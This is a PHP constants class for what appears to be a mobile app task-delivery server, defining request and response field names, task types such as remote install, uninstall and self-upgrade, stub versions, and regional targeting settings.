<?php

namespace App\constant;

class C
{

    public static $SUCCESS = 200;


    public static $KEY_VERSION = 'version';
    public static $KEY_SESSION = 'session';
    //Request
    public static $KEY_DEV_ID = 'devid';
    public static $KEY_UTD_ID = 'utdid';
    public static $KEY_MAN = 'man';
    public static $KEY_MOD = 'mod';
    public static $KEY_OSV = 'osv';
    public static $KEY_LANG = 'lang';
    public static $KEY_OPERATOR = 'operator';
    public static $KEY_IMSI = 'imsi';
    public static $KEY_DLDIR = 'dldir';
    public static $KEY_AVAISIZE = 'avaisize';
    public static $KEY_TOTAL_SIZE = 'totalsize';
    public static $KEY_MAC = 'mac';
    public static $KEY_CARRIER = 'carrier';
    public static $KEY_APPID = 'appid';
    public static $KEY_PKGNAME = 'pkgname';
    public static $KEY_CHANNEL = 'channel';
    public static $KEY_IMPL = 'version';
    public static $KEY_STUB_VERSION = 'stub_version';
    public static $KEY_CAPABILITY = 'capability';
    public static $KEY_DEBUG_IP = 'debug_ip';
    public static $KEY_IP = 'ip';
    public static $TASK_ID = 'task_id';

    public static $KEY_RM = 'rm';
    public static $KEY_INS = 'ins';
    public static $KEY_TS = 'ts';

    //Response
    public static $KEY_CODE = 'code';
    public static $KEY_CYCLE = 'cycle';
    public static $KEY_APPLIST = 'applist';

    public static $KEY_CORRELATOR = 'correlator';
    public static $KEY_TASK_ID = 'taskid';
    public static $KEY_APPNAME = 'appname';
    public static $KEY_VERSION_CODE = 'versionCode';
    public static $KEY_WIFI_ONLY = 'wifionly';
    public static $KEY_BRIEF = 'brief';
    public static $KEY_OBJECT_URI = 'objecturi';
    public static $KEY_OBJECT_SIZE = 'objectsize';
    public static $KEY_ICON = 'icon';
    public static $KEY_PIC = 'pic';
    public static $KEY_START = 'start';
    public static $KEY_TYPE = 'type';
    public static $KEY_ACTION = 'action';
    public static $KEY_CLASS = 'class';
    public static $KEY_EXTRA = 'extra';
    public static $KEY_OPERATION = 'operation';
    public static $KEY_TITLE = 'title';
    public static $KEY_MD5 = 'md5';
    public static $KEY_LINK = 'link';
    public static $KEY_CAPLIST = 'caplist';
    public static $KEY_MSG = 'msg';

    //任务详细信息各字段
	public static $TASK_KEY_ID = 'id';
	public static $TASK_KEY_AREA = 'area';
	public static $TASK_KEY_RESOURCE = 'resource';
	public static $TASK_KEY_FREQUENCY = 'frequency';
	public static $TASK_KEY_INTERVAL = 'interval';
	public static $TASK_KEY_MAX_NUM = 'max_num';
	public static $TASK_KEY_CUR_NUM = 'cur_num';
	public static $TASK_KEY_ADVANCE_CONFIG = 'advance_config';
	public static $TASK_KEY_RESOURCE_INFO = 'resource_info';
	public static $TASK_KEY_CUSTOM_DEVICE = 'custom_device';

    //resource info key(数据库中resource_info的字段,resource缩写为RSC)
	public static $RSC_KEY_PKGNAME = 'pkgname';
	public static $RSC_KEY_APPNAME = 'appname';
	public static $RSC_KEY_VERSION = 'version';
	public static $RSC_KEY_VERSION_CODE = 'version_code';
	public static $RSC_KEY_OBJECT_SIZE = 'objectsize';
	public static $RSC_KEY_BRIEF = 'brief';
	public static $RSC_KEY_WIFI_ONLY = 'wifionly';
	public static $RSC_KEY_OBJECT_URI = 'objecturi';
	public static $RSC_KEY_ICON = 'icon';
	public static $RSC_KEY_START = 'start';
	public static $RSC_KEY_TYPE_ACTION = 'type_action';
	public static $RSC_KEY_START_TYPE = 'start_type';
	public static $RSC_KEY_TITLE = 'title';
	public static $RSC_KEY_STATUS_ICON = 'status_icon';
	public static $RSC_KEY_STATUS_PIC = 'status_pic';
	public static $RSC_KEY_IMPL = 'impl';

	//Session
    public static $SESSION_APP_REQ = 'APP-REQ';
    public static $SESSION_APP_RSP = 'APP-RSP';
    public static $SESSION_NOTIFY_APP_REQ = 'NOTIFY-APP-REQ';
    public static $SESSION_NOTIFY_APP_RSP = 'NOTIFY-APP-RSP';
    public static $SESSION_EVENT_REQ = 'EVENT-REQ';
    public static $SESSION_EVENT_RSP = 'EVENT-RSP';

    //地域
    public static $AREA_CONTINENT = 'continent';
    public static $AREA_COUNTRY = 'country';
    public static $AREA_REGION = 'region';
    public static $AREA_CITY = 'city';

    //Code
    public static $CODE_1500 = '1500';
    public static $CODE_1501 = '1501';
    public static $CODE_1502 = '1502';

    //任务状态
    public static $TASK_STATUS_TESTING = 'Blue';//测试
    public static $TASK_STATUS_ONLINE = 'Success';//发布

    //任务频次
    public static $TASK_FREQUENCY_GENERAL = 1;//普通任务
    public static $TASK_FREQUENCY_MULTI = 2;//多次激活
    public static $TASK_FREQUENCY_FOREVER = 3;//无限拉取
    public static $TASK_FREQUENCY_INTERVAL = 4;//间隔拉取

    //资源类型
    public static $RESOURCE_INSTALL = 1;//下载安装
    public static $RESOURCE_INSTALL_AND_LAUNCH = 2;//下载安装并启动
    public static $RESOURCE_LAUNCH = 3;//启动
    public static $RESOURCE_UNINSTALL = 4;//卸载
    public static $RESOURCE_LINK = 5;//链接
    public static $RESOURCE_DIALOG = 6;//弹框
    public static $RESOURCE_NOTIFICATION = 7;//通知栏
    public static $RESOURCE_UPGRADE = 8;//自升级
    public static $RESOURCE_DOWNLOAD = 10;//文件下发


    //心跳周期
    public static $CYCLE_HOUR = 8;//单位：小时
    //静默期
    public static $SILENT_DAY = 90;//单位：天

    //stub版本
    public static $STUB_4_0_10 = '4.0.10';
    public static $STUB_4_0_12 = '4.0.12';
    public static $STUB_4_0_13 = '4.0.13';
    public static $STUB_4_0_14 = '4.0.14';
    public static $STUB_4_2_30 = '4.2.30';

    //任务stub版本
    public static $TASK_STUB_1 = 1;//4.0.10
    public static $TASK_STUB_2 = 2;//4.0.12
    public static $TASK_STUB_3 = 3;//4.0.14
    public static $TASK_STUB_4 = 4;//4.2.XX

    //任务高级配置项各字段
    public static $TASK_KEY_ADVANCE_COUNTRY_RULE = 'country_rule';//国家校验规则
    public static $TASK_KEY_ADVANCE_COUNTRY = 'country';//国家
    public static $TASK_KEY_ADVANCE_REGION = 'region';//省份、洲
    public static $TASK_KEY_ADVANCE_CITY = 'city';//城市
    public static $TASK_KEY_ADVANCE_MODEL_RULE = 'model_rule';//机型校验规则
    public static $TASK_KEY_ADVANCE_MODEL = 'model';//机型
    public static $TASK_KEY_ADVANCE_GROUP = 'group';//分组

    //任务地域
    public static $TASK_AREA_DOMESTIC = 1;//国内
    public static $TASK_AREA_OVERSEA = 2;//海外
    public static $TASK_AREA_GLOBAL = 3;//全球

    //中国编码
    public static $CHINA_CODE = 'CN';

    //自升级任务
    public static $TASK_UPGRADE_IMPL = 'impl';//impl版本
    public static $TASK_UPGRADE_STUB = 'stub';//stub版本

    //任务黑白名单
    public static $TASK_WHITE = 'white';//白名单
    public static $TASK_BLACK = 'black';//黑名单

}